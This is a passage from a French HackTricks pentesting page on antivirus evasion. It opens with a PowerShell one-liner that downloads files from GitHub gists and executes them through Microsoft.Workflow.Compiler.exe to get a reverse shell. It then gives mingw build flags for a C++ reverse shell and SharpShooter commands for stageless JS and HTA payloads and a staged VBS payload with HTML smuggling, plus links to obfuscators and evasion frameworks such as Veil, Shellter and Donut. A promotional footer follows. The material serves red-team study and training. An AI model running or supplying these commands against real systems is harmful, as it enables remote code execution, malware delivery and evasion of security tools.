powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Liste des obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Plus

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
